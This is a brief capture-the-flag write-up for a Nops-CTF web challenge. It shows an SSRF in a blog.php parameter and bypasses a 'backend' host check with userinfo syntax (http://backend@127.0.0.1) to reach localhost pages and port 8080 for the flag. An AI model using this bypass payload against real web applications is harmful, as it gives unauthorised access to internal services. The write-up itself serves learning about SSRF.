# Nops-CTF

blog - challenge

we get `/blog.php` while fuzzing.

`https://nopsctf-fc40017662fd-blog-3.chals.io/blog.php`

try ssrf :

[`https://nopsctf-fc40017662fd-blog-3.chals.io/blog.php?blog=asd`](https://nopsctf-fc40017662fd-blog-3.chals.io/blog.php?blog=asd) = `{"error":"Invalid ID"}`

[`https://nopsctf-fc40017662fd-blog-3.chals.io/blog.php?blog=http://127.0.0.1`](https://nopsctf-fc40017662fd-blog-3.chals.io/blog.php?blog=http://127.0.0.1:8080) = output : 

```
Warning: Request should only be sent to **backend** host.
```

so we have to use `backend` as the host.

payload :

```bash
blog=http://backend@127.0.0.1
```

payload explain : 

AS it going to open [`http://backend`](http://backend) but by using `@IP` it going to redirect on that ip instant of `http://backend` . so we can redirect it to localhost. and try to read file.

so by using `127.0.0.1/index.php` we can read file.

`@127.0.0.1/server-status` : to see server status page (default)

so we can try to see other port are open or not byf fuzzing.and we get flag.

payload:

```bash
https://nopsctf/blog.php?blog=http://backend.com@127.0.0.1:8080
```